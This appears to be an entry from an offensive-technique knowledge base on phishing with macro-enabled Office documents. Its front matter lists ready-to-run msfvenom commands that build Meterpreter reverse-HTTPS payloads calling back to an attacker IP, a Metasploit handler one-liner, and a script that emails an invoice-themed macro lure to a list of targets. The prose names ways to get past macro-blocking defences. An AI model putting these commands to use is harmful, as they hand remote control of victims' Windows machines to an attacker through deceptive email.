---
id: init-001
title: "Phishing with Macro Document"
category: initial_access
tags: [phishing, macro, vba, msfvenom, email-delivery, initial-access]
platform: [windows]
commands:
  - "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker-ip> LPORT=443 -f vba -o macro_payload.vba"
  - "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 443; run'"
  - "python3 phishing_server.py --template invoice --payload macro_payload.vba --target emails.txt"
  - "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker-ip> LPORT=443 -f exe -o payload.exe"
references:
  - "https://attack.mitre.org/techniques/T1566/001/"
  - "https://book.hacktricks.xyz/phishing-methodology"
---

Phishing with macro-enabled Office documents (`.docm`, `.xlsm`) remains one of the most effective initial access techniques, delivering VBA macro payloads that execute when the victim enables macros in response to a social engineering pretext such as a fake invoice, HR notice, or IT alert. Payloads are generated with `msfvenom` or custom loaders and embedded in Office documents, often combined with template injection or remote template techniques to bypass static file analysis. While macro execution is disabled by default in newer Office versions via the "Mark of the Web" policy, techniques such as XLL add-ins, ISO/LNK delivery, and HTML Smuggling are used to bypass these restrictions.
